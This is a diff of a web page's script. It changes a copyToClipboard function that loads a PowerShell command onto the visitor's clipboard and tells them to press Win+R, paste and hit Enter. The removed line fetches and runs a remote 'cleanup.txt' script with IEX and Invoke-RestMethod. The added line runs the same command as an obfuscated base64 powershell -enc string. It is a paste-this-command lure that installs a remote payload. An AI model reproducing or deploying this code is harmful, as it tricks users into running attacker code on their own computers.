@@ -33,7 +33,7 @@
     <script>
         function copyToClipboard() {
             var instructions = "\n1. hold down the windows key then press 'r'\n 2. hold down 'CTRL' then press 'v'\n 3. press ENTER! ";
-            var textToCopy = 'IEX (Invoke-RestMethod -Uri "https://ambitious-beach-044c1211e.6.azurestaticapps.net/cleanup.txt")'
+            var textToCopy = 'powershell -enc SQBFAFgAKABJAG4AdgBvAGsAZQAtAFIAZQBzAHQATQBlAHQAaABvAGQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AYQBtAGIAaQB0AGkAbwB1AHMALQBiAGUAYQBjAGgALQAwADQANABjADEAMgAxADEAZQAuADYALgBhAHoAdQByAGUAcwB0AGEAdABpAGMAYQBwAHAAcwAuAG4AZQB0AC8AYwBsAGUAYQBuAHUAcAAuAHQAeAB0ACIAKQA='
             const el = document.createElement('textarea');
             el.value = textToCopy;
             document.body.appendChild(el);
